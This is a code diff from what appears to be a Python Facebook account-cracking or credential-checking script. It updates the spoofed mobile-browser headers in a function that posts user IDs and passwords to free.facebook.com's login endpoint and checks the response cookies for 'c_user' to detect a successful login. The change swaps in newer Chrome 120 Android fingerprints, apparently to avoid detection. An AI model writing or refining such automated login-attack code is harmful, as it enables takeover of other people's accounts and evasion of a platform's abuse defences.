@@ -755,19 +755,27 @@ def YounisXyz(uid,pwx,tl):
             "login":"Log In"}
             xyzheader_fuck = {
     'authority': 'free.facebook.com',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99"',
+    'method':'GET',
+    'path':'/?tbua=1',
+    'scheme':'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',    
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"TECNO KE5j"',
     'sec-ch-ua-platform': '"Android"',
-    'upgrade-insecure-requests': '1',
-    'user-agent': XyzAgents,
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-user': '?1',
+    'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
-    'referer': 'https://m.facebook.com/login',
-    'accept-language': 'en-US,en;q=0.9',}
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980'}
             lo = session.post('https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
